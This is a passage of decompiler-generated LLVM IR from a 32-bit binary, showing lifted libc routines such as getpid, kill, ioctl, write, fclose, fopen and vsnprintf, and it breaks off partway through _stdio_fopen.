dec_label_pc_8049f38:                             ; preds = %dec_label_pc_8049f34
  br i1 %v1_8049ec9, label %dec_label_pc_8049f4e, label %dec_label_pc_8049f3c

dec_label_pc_8049f3c:                             ; preds = %dec_label_pc_8049f38
  %v0_8049f3f = load i32, i32* @esi, align 4
  store i32 %v0_8049f3f, i32* %stack_var_-44, align 4
  %v4_8049f40 = inttoptr i32 %v0_8049f3f to i32*
  %v5_8049f40 = call i32 @realloc(i32* %v4_8049f40, i32 %v2_8049f18, i32 %v0_8049f1a, i32 %v0_8049f1a)
  %v1_8049f48 = icmp eq i32 %v5_8049f40, 0
  %v1_8049f4c = icmp eq i1 %v1_8049f48, false
  br i1 %v1_8049f4c, label %dec_label_pc_8049f66, label %dec_label_pc_8049f4e

dec_label_pc_8049f4e:                             ; preds = %dec_label_pc_8049f3c, %dec_label_pc_8049f38
  %v0_8049f4e = load i32, i32* @esi, align 4
  br label %dec_label_pc_8049f66

dec_label_pc_8049f52:                             ; preds = %dec_label_pc_8049f30, %dec_label_pc_8049f25
  %v0_8049f52 = load i32, i32* @edi, align 4
  %v1_8049f52 = icmp eq i32 %v0_8049f52, 0
  %v1_8049f54 = icmp eq i1 %v1_8049f52, false
  br i1 %v1_8049f54, label %dec_label_pc_8049f64, label %dec_label_pc_8049f56

dec_label_pc_8049f56:                             ; preds = %dec_label_pc_8049f52
  %v0_8049f59 = load i32, i32* @esi, align 4
  store i32 %v0_8049f59, i32* %stack_var_-44, align 4
  %v1_8049f5a = call i32 @free(i32 %v0_8049f59)
  %v0_8049f69.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8049f66

dec_label_pc_8049f64:                             ; preds = %dec_label_pc_8049f52, %dec_label_pc_8049efb, %dec_label_pc_8049ecf
  br label %dec_label_pc_8049f66

dec_label_pc_8049f66:                             ; preds = %dec_label_pc_8049f3c, %dec_label_pc_8049f34, %dec_label_pc_8049f56, %dec_label_pc_8049f4e, %dec_label_pc_8049f64
  %v0_8049f69 = phi i32 [ %v5_8049f40, %dec_label_pc_8049f3c ], [ %v0_8049f34, %dec_label_pc_8049f34 ], [ %v0_8049f69.pre, %dec_label_pc_8049f56 ], [ %v0_8049f4e, %dec_label_pc_8049f4e ], [ 0, %dec_label_pc_8049f64 ]
  %v0_8049f66 = load i32, i32* @esp, align 4
  %v5_8049f66 = icmp ugt i32 %v0_8049f66, -13
  store i1 %v5_8049f66, i1* @cf, align 1
  store i32 %v0_8049ebb, i32* @ebx, align 4
  store i32 %v0_8049eba, i32* @esi, align 4
  store i32 %v0_8049eb9, i32* @edi, align 4
  store i32 %v0_8049eb8, i32* @ebp, align 4
  ret i32 %v0_8049f69

; uselistorder directives
  uselistorder i32 %v2_8049f18, { 1, 3, 0, 2 }
  uselistorder i32 %v0_8049efe, { 1, 0 }
  uselistorder i32 %v3_8049edf, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-44, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8049f66, { 4, 2, 3, 0, 1 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8049f70 = load i32, i32* @global_var_8055dd0.307, align 16
  store i32 %v0_8049f70, i32* @edx, align 4
  %v1_8049f7b = icmp eq i32 %v0_8049f70, 0
  %v1_8049f7d = icmp eq i1 %v1_8049f7b, false
  %v4_8049f7d = select i1 %v1_8049f7d, i32 %v0_8049f70, i32 4096
  ret i32 %v4_8049f7d
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049f84 = load i32, i32* @ebx, align 4
  store i32 %v0_8049f84, i32* %stack_var_-4, align 4
  %v1_8049f8d = call i32 @getpid(i32 %v0_8049f84)
  store i32 %v1_8049f8d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049f8d, -4095
  br i1 %tmp, label %dec_label_pc_8049fa4, label %dec_label_pc_8049f98

dec_label_pc_8049f98:                             ; preds = %entry
  %v0_8049f98 = load i32, i32* %stack_var_-4, align 4
  %v1_8049f98 = call i32 @__errno_location(i32 %v0_8049f98)
  %v0_8049f9d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049f9d = sub i32 0, %v0_8049f9d
  %v2_8049f9f = inttoptr i32 %v1_8049f98 to i32*
  store i32 %v1_8049f9d, i32* %v2_8049f9f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049fa4

dec_label_pc_8049fa4:                             ; preds = %entry, %dec_label_pc_8049f98
  %v0_8049fa5 = phi i32 [ %v1_8049f8d, %entry ], [ -1, %dec_label_pc_8049f98 ]
  %v2_8049fa8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049fa8, i32* @ebx, align 4
  ret i32 %v0_8049fa5

; uselistorder directives
  uselistorder i32 %v1_8049f8d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049fa4, { 1, 0 }
}

define i32 @getppid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049fac = load i32, i32* @ebx, align 4
  store i32 %v0_8049fac, i32* %stack_var_-4, align 4
  %v1_8049fb5 = call i32 @getppid(i32 %v0_8049fac)
  store i32 %v1_8049fb5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049fb5, -4095
  br i1 %tmp, label %dec_label_pc_8049fcc, label %dec_label_pc_8049fc0

dec_label_pc_8049fc0:                             ; preds = %entry
  %v0_8049fc0 = load i32, i32* %stack_var_-4, align 4
  %v1_8049fc0 = call i32 @__errno_location(i32 %v0_8049fc0)
  %v0_8049fc5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049fc5 = sub i32 0, %v0_8049fc5
  %v2_8049fc7 = inttoptr i32 %v1_8049fc0 to i32*
  store i32 %v1_8049fc5, i32* %v2_8049fc7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049fcc

dec_label_pc_8049fcc:                             ; preds = %entry, %dec_label_pc_8049fc0
  %v0_8049fcd = phi i32 [ %v1_8049fb5, %entry ], [ -1, %dec_label_pc_8049fc0 ]
  %v2_8049fd0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049fd0, i32* @ebx, align 4
  ret i32 %v0_8049fcd

; uselistorder directives
  uselistorder i32 %v1_8049fb5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @getppid, { 1, 0 }
  uselistorder label %dec_label_pc_8049fcc, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8049fd4 = load i32, i32* @edi, align 4
  store i32 %v0_8049fd4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8049fec = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8049ff4 = call i32 @ioctl(i32 %v0_8049fec, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8049fec, i32* @ebx, align 4
  store i32 %v3_8049ff4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_8049ff4, -4095
  br i1 %tmp, label %dec_label_pc_804a00c, label %dec_label_pc_804a000

dec_label_pc_804a000:                             ; preds = %entry
  %v1_804a000 = call i32 @__errno_location(i32 %v0_8049fec)
  %v0_804a005 = load i32, i32* %edi.global-to-local, align 4
  %v1_804a005 = sub i32 0, %v0_804a005
  %v2_804a007 = inttoptr i32 %v1_804a000 to i32*
  store i32 %v1_804a005, i32* %v2_804a007, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804a00c

dec_label_pc_804a00c:                             ; preds = %entry, %dec_label_pc_804a000
  %v0_804a00f = phi i32 [ %v3_8049ff4, %entry ], [ -1, %dec_label_pc_804a000 ]
  %v2_804a011 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a011, i32* @edi, align 4
  ret i32 %v0_804a00f

; uselistorder directives
  uselistorder i32 %v3_8049ff4, { 1, 0, 2 }
  uselistorder i32 %v0_8049fec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a00c, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804a014 = load i32, i32* @ebx, align 4
  store i32 %v0_804a014, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804a027 = call i32 @kill(i32 %v0_804a014, i32 %tmp4)
  store i32 %v2_804a027, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804a027, -4095
  br i1 %tmp, label %dec_label_pc_804a040, label %dec_label_pc_804a034

dec_label_pc_804a034:                             ; preds = %entry
  %v0_804a034 = load i32, i32* %stack_var_-4, align 4
  %v1_804a034 = call i32 @__errno_location(i32 %v0_804a034)
  %v0_804a039 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a039 = sub i32 0, %v0_804a039
  %v2_804a03b = inttoptr i32 %v1_804a034 to i32*
  store i32 %v1_804a039, i32* %v2_804a03b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a040

dec_label_pc_804a040:                             ; preds = %entry, %dec_label_pc_804a034
  %v0_804a041 = phi i32 [ %v2_804a027, %entry ], [ -1, %dec_label_pc_804a034 ]
  %v2_804a040 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804a040, i32* @edx, align 4
  %v2_804a044 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a044, i32* @ebx, align 4
  ret i32 %v0_804a041

; uselistorder directives
  uselistorder i32 %v2_804a027, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a040, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804a049 = load i32, i32* @esi, align 4
  store i32 %v0_804a049, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804a061 = load i32, i32* @ebx, align 4
  %v1_804a069 = call i32 @int80_syscall(i32 142)
  store i32 %v0_804a061, i32* @ebx, align 4
  store i32 %v1_804a069, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804a069, -4095
  br i1 %tmp, label %dec_label_pc_804a081, label %dec_label_pc_804a075

dec_label_pc_804a075:                             ; preds = %entry
  %v1_804a075 = call i32 @__errno_location(i32 %v0_804a061)
  %v0_804a07a = load i32, i32* %esi.global-to-local, align 4
  %v1_804a07a = sub i32 0, %v0_804a07a
  %v2_804a07c = inttoptr i32 %v1_804a075 to i32*
  store i32 %v1_804a07a, i32* %v2_804a07c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804a081

dec_label_pc_804a081:                             ; preds = %entry, %dec_label_pc_804a075
  %v0_804a082 = phi i32 [ %v1_804a069, %entry ], [ -1, %dec_label_pc_804a075 ]
  %v2_804a084 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804a084, i32* @esi, align 4
  ret i32 %v0_804a082

; uselistorder directives
  uselistorder i32 %v1_804a069, { 1, 0, 2 }
  uselistorder i32 %v0_804a061, { 1, 0 }
  uselistorder label %dec_label_pc_804a081, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804a088 = load i32, i32* @edi, align 4
  store i32 %v0_804a088, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804a090 = load i32, i32* @ebx, align 4
  %v2_804a098 = call i32 @time(i32* %arg1)
  store i32 %v0_804a090, i32* @ebx, align 4
  store i32 %v2_804a098, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804a098, -4095
  br i1 %tmp, label %dec_label_pc_804a0b0, label %dec_label_pc_804a0a4

dec_label_pc_804a0a4:                             ; preds = %entry
  %v1_804a0a4 = call i32 @__errno_location(i32 %v0_804a090)
  %v0_804a0a9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804a0a9 = sub i32 0, %v0_804a0a9
  %v2_804a0ab = inttoptr i32 %v1_804a0a4 to i32*
  store i32 %v1_804a0a9, i32* %v2_804a0ab, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804a0b0

dec_label_pc_804a0b0:                             ; preds = %entry, %dec_label_pc_804a0a4
  %v0_804a0b1 = phi i32 [ %v2_804a098, %entry ], [ -1, %dec_label_pc_804a0a4 ]
  %v2_804a0b4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a0b4, i32* @edi, align 4
  ret i32 %v0_804a0b1

; uselistorder directives
  uselistorder i32 %v2_804a098, { 1, 0, 2 }
  uselistorder i32 %v0_804a090, { 1, 0 }
  uselistorder label %dec_label_pc_804a0b0, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804a0c9 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_804a0c9
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804a0d4 = load i32, i32* @edi, align 4
  store i32 %v0_804a0d4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804a0e4 = load i32, i32* @ebx, align 4
  %v4_804a0ec = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804a0e4, i32* @ebx, align 4
  store i32 %v4_804a0ec, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804a0ec, -4095
  br i1 %tmp, label %dec_label_pc_804a104, label %dec_label_pc_804a0f8

dec_label_pc_804a0f8:                             ; preds = %entry
  %v1_804a0f8 = call i32 @__errno_location(i32 %v0_804a0e4)
  %v0_804a0fd = load i32, i32* %edi.global-to-local, align 4
  %v1_804a0fd = sub i32 0, %v0_804a0fd
  %v2_804a0ff = inttoptr i32 %v1_804a0f8 to i32*
  store i32 %v1_804a0fd, i32* %v2_804a0ff, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804a104

dec_label_pc_804a104:                             ; preds = %entry, %dec_label_pc_804a0f8
  %v0_804a105 = phi i32 [ %v4_804a0ec, %entry ], [ -1, %dec_label_pc_804a0f8 ]
  %v2_804a104 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804a104, i32* @edx, align 4
  %v2_804a108 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a108, i32* @edi, align 4
  ret i32 %v0_804a105

; uselistorder directives
  uselistorder i32 %v4_804a0ec, { 1, 0, 2 }
  uselistorder i32 %v0_804a0e4, { 1, 0 }
  uselistorder label %dec_label_pc_804a104, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804a110 = add i32 %arg1, 128
  %v6_804a11b = icmp ugt i32 %v1_804a110, 383
  br i1 %v6_804a11b, label %dec_label_pc_804a126, label %dec_label_pc_804a11d

dec_label_pc_804a11d:                             ; preds = %entry
  %v0_804a11d = load i32, i32* inttoptr (i32 134558908 to i32*), align 4
  %v2_804a122 = mul i32 %arg1, 2
  %v3_804a122 = add i32 %v0_804a11d, %v2_804a122
  %v4_804a122 = inttoptr i32 %v3_804a122 to i16*
  %v5_804a122 = load i16, i16* %v4_804a122, align 2
  %v6_804a122 = sext i16 %v5_804a122 to i32
  br label %dec_label_pc_804a126

dec_label_pc_804a126:                             ; preds = %entry, %dec_label_pc_804a11d
  %v0_804a126 = phi i32 [ %arg1, %entry ], [ %v6_804a122, %dec_label_pc_804a11d ]
  ret i32 %v0_804a126

; uselistorder directives
  uselistorder label %dec_label_pc_804a126, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8055de0.312 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804a134 = load i32, i32* @ebp, align 4
  %v0_804a135 = load i32, i32* @edi, align 4
  %v0_804a136 = load i32, i32* @esi, align 4
  %v0_804a137 = load i32, i32* @ebx, align 4
  %v4_804a13b = ptrtoint i16* %arg1 to i32
  store i32 %v4_804a13b, i32* @esi, align 4
  %v1_804a13f = add i32 %v4_804a13b, 52
  %v2_804a13f = inttoptr i32 %v1_804a13f to i32*
  %v3_804a13f = load i32, i32* %v2_804a13f, align 4
  store i32 %v3_804a13f, i32* @ebp, align 4
  %v1_804a142 = icmp eq i32 %v3_804a13f, 0
  %v1_804a144 = icmp eq i1 %v1_804a142, false
  br i1 %v1_804a144, label %dec_label_pc_804a165, label %dec_label_pc_804a146

dec_label_pc_804a146:                             ; preds = %entry
  %v1_804a146 = add i32 %v4_804a13b, 56
  store i32 %v1_804a146, i32* @ebx, align 4
  %v2_804a150 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804a150, i32* @eax, align 4
  %v2_804a155 = call i32 @__pthread_return_void(i32 %v2_804a150, i32 134535499)
  %v0_804a15a = load i32, i32* @ebx, align 4
  %v1_804a15d = call i32 @__pthread_return_0(i32 %v0_804a15a)
  store i32 %v1_804a15d, i32* @eax, align 4
  %v0_804a167.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a165

dec_label_pc_804a165:                             ; preds = %entry, %dec_label_pc_804a146
  %v0_804a16f = phi i32 [ %v4_804a13b, %entry ], [ %v0_804a167.pre, %dec_label_pc_804a146 ]
  store i32 0, i32* @edi, align 4
  %v1_804a167 = inttoptr i32 %v0_804a16f to i8*
  %v2_804a167 = load i8, i8* %v1_804a167, align 1
  %v3_804a167 = and i8 %v2_804a167, 64
  %v4_804a167 = icmp eq i8 %v3_804a167, 0
  br i1 %v4_804a167, label %dec_label_pc_804a165.dec_label_pc_804a17a_crit_edge, label %dec_label_pc_804a16c

dec_label_pc_804a165.dec_label_pc_804a17a_crit_edge: ; preds = %dec_label_pc_804a165
  br label %dec_label_pc_804a17a

dec_label_pc_804a16c:                             ; preds = %dec_label_pc_804a165
  %v1_804a170 = inttoptr i32 %v0_804a16f to i16*
  %v2_804a170 = call i32 @fflush_unlocked(i16* %v1_804a170)
  store i32 %v2_804a170, i32* @edi, align 4
  %v0_804a17d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a17a

dec_label_pc_804a17a:                             ; preds = %dec_label_pc_804a165.dec_label_pc_804a17a_crit_edge, %dec_label_pc_804a16c
  %v0_804a17d = phi i32 [ %v0_804a16f, %dec_label_pc_804a165.dec_label_pc_804a17a_crit_edge ], [ %v0_804a17d.pre, %dec_label_pc_804a16c ]
  %v1_804a17d = add i32 %v0_804a17d, 4
  %v2_804a17d = inttoptr i32 %v1_804a17d to i32*
  %v3_804a17d = load i32, i32* %v2_804a17d, align 4
  %v1_804a180 = call i32 @__libc_close(i32 %v3_804a17d)
  %v0_804a188 = load i32, i32* @esi, align 4
  %v1_804a188 = add i32 %v0_804a188, 4
  %v2_804a188 = inttoptr i32 %v1_804a188 to i32*
  store i32 -1, i32* %v2_804a188, align 4
  %v2_804a199 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804a199, i32* @ebx, align 4
  %v2_804a19e = icmp slt i32 %v1_804a180, 0
  store i32 -1, i32* @eax, align 4
  %v1_804a1a5 = load i32, i32* @edi, align 4
  %v3_804a1a5 = select i1 %v2_804a19e, i32 -1, i32 %v1_804a1a5
  store i32 %v3_804a1a5, i32* @edi, align 4
  %v2_804a1a8 = call i32 @__pthread_return_void(i32 %v2_804a199, i32 134535499)
  %v1_804a1b4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80534f0.313 to i32))
  %v0_804a1b9 = load i32, i32* @global_var_8053ba4.314, align 4
  %v1_804a1be = add i32 %v0_804a1b9, 1
  store i32 %v1_804a1be, i32* @global_var_8053ba4.314, align 4
  store i32 ptrtoint (i32* @global_var_80534f0.313 to i32), i32* @eax, align 4
  %v2_804a1c9 = call i32 @__pthread_return_void(i32 %v2_804a199, i32 1)
  %v0_804a1ce = load i32, i32* @esi, align 4
  %v1_804a1ce = inttoptr i32 %v0_804a1ce to i32*
  %v2_804a1ce = load i32, i32* %v1_804a1ce, align 4
  %v1_804a1d3 = and i32 %v2_804a1ce, 24576
  %v1_804a1d8 = or i32 %v1_804a1d3, 48
  store i32 %v1_804a1d8, i32* @eax, align 4
  %v1_804a1dd = trunc i32 %v1_804a1d8 to i16
  %v3_804a1dd = inttoptr i32 %v0_804a1ce to i16*
  store i16 %v1_804a1dd, i16* %v3_804a1dd, align 2
  br i1 %v1_804a144, label %dec_label_pc_804a1f3, label %dec_label_pc_804a1e2

dec_label_pc_804a1e2:                             ; preds = %dec_label_pc_804a17a
  %v2_804a1e6 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804a1e6, i32* @eax, align 4
  %v2_804a1eb = call i32 @__pthread_return_void(i32 %v2_804a1e6, i32 1)
  store i32 %v2_804a1eb, i32* @eax, align 4
  br label %dec_label_pc_804a1f3

dec_label_pc_804a1f3:                             ; preds = %dec_label_pc_804a17a, %dec_label_pc_804a1e2
  %v0_804a1f3 = load i32, i32* @esi, align 4
  %v1_804a1f3 = add i32 %v0_804a1f3, 1
  %v2_804a1f3 = inttoptr i32 %v1_804a1f3 to i8*
  %v3_804a1f3 = load i8, i8* %v2_804a1f3, align 1
  %v4_804a1f3 = and i8 %v3_804a1f3, 64
  %v5_804a1f3 = icmp eq i8 %v4_804a1f3, 0
  br i1 %v5_804a1f3, label %dec_label_pc_804a207, label %dec_label_pc_804a1f9

dec_label_pc_804a1f9:                             ; preds = %dec_label_pc_804a1f3
  %v1_804a1fc = add i32 %v0_804a1f3, 8
  %v2_804a1fc = inttoptr i32 %v1_804a1fc to i32*
  %v3_804a1fc = load i32, i32* %v2_804a1fc, align 4
  %v1_804a1ff = call i32 @free(i32 %v3_804a1fc)
  store i32 %v1_804a1ff, i32* @eax, align 4
  br label %dec_label_pc_804a207

dec_label_pc_804a207:                             ; preds = %dec_label_pc_804a1f3, %dec_label_pc_804a1f9
  %v2_804a213 = call i32 @__pthread_return_void(i32 %v2_804a199, i32 134535499)
  %v1_804a21f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80534f0.313 to i32))
  store i32 ptrtoint (i32* @global_var_80534f0.313 to i32), i32* @eax, align 4
  %v0_804a225 = load i32, i32* @global_var_8053ba8.315, align 8
  %v1_804a225 = add i32 %v0_804a225, 1
  store i32 %v1_804a225, i32* @global_var_8053ba8.315, align 8
  %v2_804a22f = call i32 @__pthread_return_void(i32 %v2_804a199, i32 1)
  %v0_804a234 = call i32 @_stdio_openlist_dec_use()
  %v0_804a23c = load i32, i32* @edi, align 4
  store i32 %v0_804a137, i32* @ebx, align 4
  store i32 %v0_804a136, i32* @esi, align 4
  store i32 %v0_804a135, i32* @edi, align 4
  store i32 %v0_804a134, i32* @ebp, align 4
  ret i32 %v0_804a23c

; uselistorder directives
  uselistorder i32 %v2_804a199, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_804a207, { 1, 0 }
  uselistorder label %dec_label_pc_804a1f3, { 1, 0 }
  uselistorder label %dec_label_pc_804a17a, { 1, 0 }
  uselistorder label %dec_label_pc_804a165, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804a253 = inttoptr i32 %arg2 to i8*
  %v5_804a253 = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_804a253, i32 0, i32 -1)
  ret i32 %v5_804a253
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804a26d = inttoptr i32 %arg1 to i8*
  %v5_804a26d = call i32 @__GI_vsnprintf(i8* %v4_804a26d, i32 -1, i32 %arg2, i32 %arg3)
  ret i32 %v5_804a26d
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_804a27b = ptrtoint i32* %stack_var_12 to i32
  %v4_804a28e = inttoptr i32 %arg1 to i8*
  %v5_804a28e = call i32 @__GI_vsnprintf(i8* %v4_804a28e, i32 -1, i32 %arg2, i32 %v2_804a27b)
  ret i32 %v5_804a28e
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804a298 = load i32, i32* @ebp, align 4
  %v0_804a299 = load i32, i32* @edi, align 4
  %v0_804a29a = load i32, i32* @esi, align 4
  %v0_804a29b = load i32, i32* @ebx, align 4
  store i32 %v0_804a29b, i32* %stack_var_-16, align 4
  %v4_804a29f = ptrtoint i8* %arg1 to i32
  store i32 %v4_804a29f, i32* @esi, align 4
  %v2_804a2a3 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_804a2ae = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804a2ae, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_804a2c8 = sub i32 -1, %v4_804a29f
  %v1_804a2db = call i32 @__stdio_init_mutex(i32 %v2_804a2a3)
  %v1_804a2eb = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_804a2c8, %v1_804a2eb
  %v5_804a2ed = select i1 %tmp, i32 %v1_804a2c8, i32 %v1_804a2eb
  store i32 %v5_804a2ed, i32* @ebx, align 4
  %v0_804a2f0 = load i32, i32* @esi, align 4
  %v3_804a31a = inttoptr i32 %arg3 to i8*
  %v4_804a31a = call i32 @_vfprintf_internal(i32 %v2_804a2ae, i8* %v3_804a31a, i32 %arg4)
  %v1_804a322 = icmp eq i32 %v5_804a2ed, 0
  store i32 %v4_804a31a, i32* @edx, align 4
  br i1 %v1_804a322, label %dec_label_pc_804a33e, label %dec_label_pc_804a337

dec_label_pc_804a337:                             ; preds = %entry
  %stack_var_-80.0 = inttoptr i32 %v0_804a2f0 to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804a341.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804a33e

dec_label_pc_804a33e:                             ; preds = %entry, %dec_label_pc_804a337
  %v0_804a341 = phi i32 [ %v4_804a31a, %entry ], [ %v0_804a341.pre, %dec_label_pc_804a337 ]
  %v2_804a343 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804a343, i32* @ebx, align 4
  store i32 %v0_804a29a, i32* @esi, align 4
  store i32 %v0_804a299, i32* @edi, align 4
  store i32 %v0_804a298, i32* @ebp, align 4
  ret i32 %v0_804a341

; uselistorder directives
  uselistorder i32 %v1_804a2eb, { 1, 0 }
  uselistorder i32 %v1_804a2c8, { 1, 0 }
  uselistorder label %dec_label_pc_804a33e, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804a348 = load i32, i32* @ebp, align 4
  %v0_804a349 = load i32, i32* @edi, align 4
  %v0_804a34a = load i32, i32* @esi, align 4
  %v0_804a34b = load i32, i32* @ebx, align 4
  store i32 %v0_804a34b, i32* %stack_var_-16, align 4
  %v4_804a34f = ptrtoint i8* %arg2 to i32
  store i32 %v4_804a34f, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804a35f = load i8, i8* %arg2, align 1
  %v3_804a35f = zext i8 %v2_804a35f to i32
  %v4_804a35f = load i32, i32* @eax, align 4
  %v5_804a35f = and i32 %v4_804a35f, -256
  %v6_804a35f = or i32 %v5_804a35f, %v3_804a35f
  store i32 %v6_804a35f, i32* %eax.global-to-local, align 4
  %v10_804a361 = icmp eq i8 %v2_804a35f, 114
  br i1 %v10_804a361, label %dec_label_pc_804a3a3, label %dec_label_pc_804a365

dec_label_pc_804a365:                             ; preds = %entry
  %v10_804a365 = icmp eq i8 %v2_804a35f, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_804a365, label %dec_label_pc_804a3a5, label %dec_label_pc_804a36e

dec_label_pc_804a36e:                             ; preds = %dec_label_pc_804a365
